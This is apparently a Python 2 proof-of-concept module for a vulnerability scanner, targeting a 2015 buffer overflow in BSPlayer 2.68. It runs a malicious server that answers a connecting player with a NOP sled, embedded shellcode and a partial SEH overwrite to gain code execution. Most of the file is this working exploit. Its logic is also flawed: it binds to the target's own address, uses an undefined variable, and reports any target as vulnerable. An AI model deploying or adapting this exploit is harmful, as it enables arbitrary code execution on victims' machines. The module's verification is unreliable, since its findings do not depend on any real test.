# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys
import socket
import urlparse

class Vuln(ABVuln):
    poc_id = '71a259ce-2bea-4eac-bdb0-521eec4ba85a'
    name = 'BSPlayer2.68 缓冲区溢出漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-03-24'  # 漏洞公布时间
    desc = '''
        BSPlayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.
        In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full
        address and then used backward jumping to jump to a long jump that eventually land in my shellcode.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36477/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'BSPlayer'  # 漏洞应用名称
    product_version = 'BSPlayer2.68'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7fbaa4e2-b03e-46e6-856d-ae7a0db41330'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            s = socket.socket()         # Create a socket object
            url = urlparse.urlparse(self.target).netloc
            host = socket.gethostbyname(url)   # Ip to listen to.
            port = urlparse.urlparse(self.target).port     # Reserve a port for your service.
            s.bind((host, port))         # Bind to the port

            s.listen(10)                 # Now wait for client connection.
            c, addr = s.accept()         # Establish connection with client.
            # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.

            c.recv(1024)
            #seh and nseh.
            buf =  ""
            buf += "\xbb\xe4\xf3\xb8\x70\xda\xc0\xd9\x74\x24\xf4\x58\x31"
            buf += "\xc9\xb1\x33\x31\x58\x12\x83\xc0\x04\x03\xbc\xfd\x5a"
            buf += "\x85\xc0\xea\x12\x66\x38\xeb\x44\xee\xdd\xda\x56\x94"
            buf += "\x96\x4f\x67\xde\xfa\x63\x0c\xb2\xee\xf0\x60\x1b\x01"
            buf += "\xb0\xcf\x7d\x2c\x41\xfe\x41\xe2\x81\x60\x3e\xf8\xd5"
            buf += "\x42\x7f\x33\x28\x82\xb8\x29\xc3\xd6\x11\x26\x76\xc7"
            buf += "\x16\x7a\x4b\xe6\xf8\xf1\xf3\x90\x7d\xc5\x80\x2a\x7f"
            buf += "\x15\x38\x20\x37\x8d\x32\x6e\xe8\xac\x97\x6c\xd4\xe7"
            buf += "\x9c\x47\xae\xf6\x74\x96\x4f\xc9\xb8\x75\x6e\xe6\x34"
            buf += "\x87\xb6\xc0\xa6\xf2\xcc\x33\x5a\x05\x17\x4e\x80\x80"
            buf += "\x8a\xe8\x43\x32\x6f\x09\x87\xa5\xe4\x05\x6c\xa1\xa3"
            buf += "\x09\x73\x66\xd8\x35\xf8\x89\x0f\xbc\xba\xad\x8b\xe5"
            buf += "\x19\xcf\x8a\x43\xcf\xf0\xcd\x2b\xb0\x54\x85\xd9\xa5"
            buf += "\xef\xc4\xb7\x38\x7d\x73\xfe\x3b\x7d\x7c\x50\x54\x4c"
            buf += "\xf7\x3f\x23\x51\xd2\x04\xdb\x1b\x7f\x2c\x74\xc2\x15"
            buf += "\x6d\x19\xf5\xc3\xb1\x24\x76\xe6\x49\xd3\x66\x83\x4c"
            buf += "\x9f\x20\x7f\x3c\xb0\xc4\x7f\x93\xb1\xcc\xe3\x72\x22"
            buf += "\x8c\xcd\x11\xc2\x37\x12"

            jmplong = "\xe9\x85\xe9\xff\xff"
            nseh = "\xeb\xf9\x90\x90"
            # Partially overwriting the seh record (nulls are ignored).
            seh = "\x3b\x58\x00\x00"
            buflen = len(buf)
            response = "\x90" *2048 + buf + "\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\xcc" * 7000
            c.send(response)
            c.close()
            c, addr = s.accept()        # Establish connection with client.
            # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
            if args['options']['verbose']:
                print(('[*] Sending the payload second time', addr))
            c.recv(1024)
            c.send(response)
            c.close()
            s.close()
            #args['success'] = True
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            return None

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
